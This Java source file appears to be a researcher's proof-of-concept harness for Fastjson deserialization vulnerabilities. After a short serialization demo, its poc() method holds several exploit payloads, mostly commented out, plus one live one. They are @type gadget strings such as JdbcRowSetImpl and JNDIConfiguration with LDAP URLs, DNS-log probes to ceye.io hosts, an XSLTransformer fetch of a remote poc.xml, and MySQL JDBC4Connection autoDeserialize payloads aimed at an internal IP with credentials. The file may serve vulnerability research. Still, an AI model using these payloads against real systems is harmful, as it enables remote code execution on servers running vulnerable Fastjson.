package com.orleven.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.serializer.SerializerFeature;

import java.util.HashMap;
import java.util.Map;

//@SpringBootApplication
public class Fastjson1268 {


    public void test(){

        Map<String, Object> map = new HashMap<String, Object>();
        map.put("key1", "One");
        map.put("key2", "Two");
        String mapJson = JSON.toJSONString(map);
        System.out.println(mapJson);

        User user1 = new User();
        user1.setUsername("orleven");
        user1.setAge(18);
        System.out.println("obj name:" + user1.getClass().getName());
        System.out.println();

        //序列化
        String serializedStr = JSON.toJSONString(user1);
        System.out.println("serializedStr = " + serializedStr);
        String serializedStr1 = JSON.toJSONString(user1, SerializerFeature.WriteClassName);
        System.out.println("serializedStr1 = " + serializedStr1);
        System.out.println();

        //通过parse方法进行反序列化
        Object obj1 = (Object)JSON.parse(serializedStr1);
        System.out.println(obj1);
        System.out.println("obj1 name: " + obj1.getClass().getName()+"\n");
        System.out.println();

        //通过parseObject方法进行反序列化  通过这种方法返回的是一个JSONObject
        Object obj2 = JSON.parseObject(serializedStr1);
        System.out.println(obj2);
        System.out.println("obj2 name: " + obj2.getClass().getName()+"\n");
        System.out.println();

        //通过这种方式返回的是一个相应的类对象
        Object obj3 = JSON.parseObject(serializedStr1, Object.class);
        System.out.println(obj3);
        System.out.println("obj3 name: " + obj3.getClass().getName());
        System.out.println();


        String myJSON = "{\"@type\":\"me.lightless.fastjsonvuln.User\",\"age\":99,\"username\":\"lightless\",\"secret\":\"2333\"}";
        System.out.println(myJSON);
        JSONObject u3 = JSON.parseObject(myJSON);
        System.out.println("u3 => " + u3.get("secret"));
    }



    public void poc(){

//        String myJSON = "{\"@type\":\"javax.swing.JEditorPane\",\"page\":\"http://md98c8.2w3co3.ceye.io\"}";
//        myJSON = "{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"aaaa.2w3co3.ceye.io\"}}";
//        String myJSON = "{\"@\\\\x74ype\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"ldap://dd.2w3co3.ceye.io/ExportObject\"}";
//        String myJSON = "{\"rand1\":{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://aaaa.2w3co3.ceye.io:1389/Object\",\"autoCommit\":true}}";
//        String myJSON = "{\"@type\":\"java.lang.Exception\",\"@type\":\"org.jdom2.transform.XSLTransformException\"," +
//                "\"@type\":\"org.jdom2.transform.XSLTransformer\", \"val\":\"http://1.1.1.1:80/poc.xml\"}";

//        java.io.Serializable
//        java.io.Closeable
//        java.util.Collection
//        java.lang.Iterable
//        java.lang.Object
//        java.lang.AutoCloseable
//        java.lang.Readable
//        java.lang.Cloneable
//        java.lang.Runnable
//        java.util.EventListener

//        java.lang.Exception

//        String myJSON =  "{\"@type\":\"com.caucho.config.types.ResourceRef\",\"lookupName\": \"ldap://localhost:43658/Calc\", \"value\": {\"$ref\":\"$.value\"}}";//ldap方式

//        String myJSON = "{\"@type\":\"java.lang.Exception\"," +
//                "\"@type\":\"org.jdom2.transform.XSLTransformer\",\"val\":\"http://127.0.0.1:4444/poc.xml\"}";
//        String driver = "com.mysql.jdbc.Driver";
//        String user = "root";
//        String password = "ubuntu";
//        try {
//            String url = "jdbc:mysql://127.0.0.1:3306/mysql?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true";
//            Class.forName(driver);
//            Connection conn = DriverManager.getConnection(url, user, password);
//        }catch (Exception e){
//            System.out.println(e);
//        }
//import java.nio.file.Files
//        import org.apache.commons.io.FileUtils
//        import org.jdom2.transform.XSLTransformException
//import java.io.FileOutputStream
//        import com.mysql.jdbc.JDBC4Connection;
        String myJSON = "{\"x\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.jdbc.JDBC4Connection\",\"hostToConnectTo\":\"127.0.0.1\",\"portToConnectTo\":3306,\"info\":{\"user\":\"root\",\"password\":\"root\",\"statementInterceptors\":\"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\"},\"databaseToConnectTo\":\"codeplutos\",\"url\":\"\"}}";
        System.out.println(System.getProperty("java.version"));
        myJSON = "{\"x\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.jdbc.JDBC4Connection\",\"hostToConnectTo\":\"10.83.19.19\",\"portToConnectTo\":8007,\"info\":{\"user\":\"ncew\",\"password\":\"oihnqwa\",\"statementInterceptors\":\"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\",\"useSSL\":\"false\"},\"databaseToConnectTo\":\"test\",\"url\":\"\"}}";

//        myJSON = "{\"x\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.cj.jdbc.ConnectionImpl\",\"hostInfo\":{\"host\":\"10.83.19.19\",\"port\":8007,\"user\":\"ncew\",\"password\":\"oihnqwa\",\"dbname\":\"test\",\"queryInterceptors\":\"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\",\"useSSL\":\"false\",\"url\":\"\",\"isPasswordless\":\"true\",\"properties\":\"\",\"props\":{}},\"autoCommit\": \"1\"}}";
//        myJSON = "{\"@type\":\"java.lang.AutoCloseable\"{\"@type\":\"com.mysql.jdbc.JDBC4Connection\",\"hostToConnectTo\":\"127.0.0.1\",\"portToConnectTo\":\"3306\",\"info\":{\"user\":\"ncew\",\"password\":\"oihnqwa\",\"statementInterceptors\":\"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\"},\"databaseToConnectTo\":\"1\",\"url\":\"\"}";
//        String myJSON = "{\"a\":{\"@type\":\"java.lang.Exception\"," +
//                "\"val\":\"org.jdom2.transform.XSLTransformException\"}," +
//
//                "\"b\":{" +
//                "\"@type\":\"org.jdom2.transform.XSLTransformException\"," +
//                "\"@type\":\"org.jdom2.transform.XSLTransformer\"," +
//                "\"val\":\"http://127.0.0.1:4444/poc.xml\"," +
//                "\"autoCommit\":true" +
//                "}}";
//                "\"@type\":\"org.jdom2.transform.\",\"@type\":\"com.mysql.jdbc.ConnectionImpl\",\"val\":\"jdbc:mysql://172.20.201.17:3306/misp\"}}";
        System.out.println(myJSON);
        Object u3 = JSON.parse(myJSON);
        System.out.println(u3);
//        JSONObject u3 = JSON.parseObject(myJSON);
//        System.out.println(u3);
    }


//    /**
//     * 覆盖方法configureMessageConverters，使用fastJson
//     * @return
//     */
//    @Bean
//    public HttpMessageConverters fastJsonHttpMessageConverters() {
//        //1、定义一个convert转换消息的对象
//        FastJsonHttpMessageConverter fastConverter = new FastJsonHttpMessageConverter();
//        //2、添加fastjson的配置信息
//        FastJsonConfig fastJsonConfig = new FastJsonConfig();
//        fastJsonConfig.setSerializerFeatures(SerializerFeature.PrettyFormat);
//        //3、在convert中添加配置信息
//        fastConverter.setFastJsonConfig(fastJsonConfig);
//        //4、将convert添加到converters中
//        HttpMessageConverter<?> converter = fastConverter;
//        return new HttpMessageConverters(converter);
//    }

//    @Override
//    public void configureMessageConverters(List<HttpMessageConverter<?>> converters) {
//        //1、定义一个convert转换消息的对象
//        FastJsonHttpMessageConverter fastConverter = new FastJsonHttpMessageConverter();
//        //2、添加fastjson的配置信息
//        FastJsonConfig fastJsonConfig = new FastJsonConfig();
//        fastJsonConfig.setSerializerFeatures(SerializerFeature.PrettyFormat);
//        //3、在convert中添加配置信息
//        fastConverter.setFastJsonConfig(fastJsonConfig);
//        //4、将convert添加到converters中
//        converters.add(fastConverter);
//    }

    public static void main(String args[]){

//
////        SpringApplication.run(Fastjson1266.class, args);
//        try {
//
//            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//            Fastjson1268 fastjson1268 = new Fastjson1268();
////            fastjson1266.test();
//
//            fastjson1268.poc();
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
    }
}
